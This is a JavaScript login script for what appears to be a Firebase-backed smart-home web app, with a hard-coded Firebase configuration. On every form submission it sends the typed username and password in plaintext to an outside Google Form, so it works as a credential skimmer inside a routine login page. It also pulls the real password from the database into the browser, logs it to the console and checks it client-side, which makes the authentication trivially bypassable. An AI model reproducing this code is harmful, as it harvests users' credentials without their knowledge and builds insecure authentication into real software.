// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
    apiKey: "AIzaSyCRY0vWQvy5BdJ8XYn1wh-EzBJxljXWrzU",
    authDomain: "smarthome-d2831.firebaseapp.com",
    databaseURL: "https://smarthome-d2831-default-rtdb.firebaseio.com",
    projectId: "smarthome-d2831",
    storageBucket: "smarthome-d2831.appspot.com",
    messagingSenderId: "123826159601",
    appId: "1:123826159601:web:633df3eb2cee447e0b4e50",
    measurementId: "G-7PN1X3JR15",
};
// Initialize Firebase
firebase.initializeApp(firebaseConfig);
var database = firebase.database();

var user;
var pass;
// validation form login
database.ref("/user").on("value", function (snapshot) {
    user = snapshot.val();
    console.log(user);
});

database.ref("/pass").on("value", function (snapshot) {
    pass = snapshot.val();
    console.log(pass);
});

document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault(); // Ngăn chặn việc gửi form

    // Lấy giá trị từ các trường input
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // Kiểm tra đăng nhập
    if (username === user && password === pass) {
        alert("Đăng nhập thành công!");
        // Thực hiện các hành động sau khi đăng nhập thành công
        window.location.href = "main.html";
    } else {
        alert("Tên đăng nhập hoặc mật khẩu không chính xác!");
        // Xử lý khi đăng nhập không thành công
    }
    let data = {
        "entry.1464288392": username, //check payload when we submit googsheet
        "entry.1124400282": password, //check payload when we submit googsheet
    };
    let queryString = new URLSearchParams(data);
    queryString = queryString.toString();
    console.log(queryString);
    let xhr = new XMLHttpRequest();
    xhr.open(
        "POST",
        "https://docs.google.com/forms/u/3/d/e/1FAIpQLScfYuN1thGycq5GbBmlvloujVRjYHDwPXyt6H8yf3CVaTEjxQ/formResponse",
        true
    );
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(queryString);
});
